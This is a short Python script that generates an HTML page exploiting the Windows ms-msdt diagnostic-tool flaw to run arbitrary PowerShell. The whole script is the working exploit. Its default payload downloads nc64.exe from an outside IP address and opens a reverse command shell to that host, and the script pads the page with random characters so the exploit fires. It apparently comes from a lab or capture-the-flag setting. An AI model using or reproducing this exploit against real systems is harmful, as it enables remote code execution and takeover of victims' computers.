#!/usr/bin/env python3
import base64, random, string, sys

# Change this to your reverse shell command
command = sys.argv[1] if len(sys.argv) > 1 else \
    "IWR http://10.10.16.187/nc64.exe -outfile C:\\programdata\\nc64.exe; C:\\programdata\\nc64.exe 10.10.16.187 443 -e cmd"

b64 = base64.b64encode(command.encode()).decode()

html = f'''<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{b64}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //'''
html += "".join(random.choice(string.ascii_lowercase) for _ in range(4096))
html += "\n</script>"

print(html)
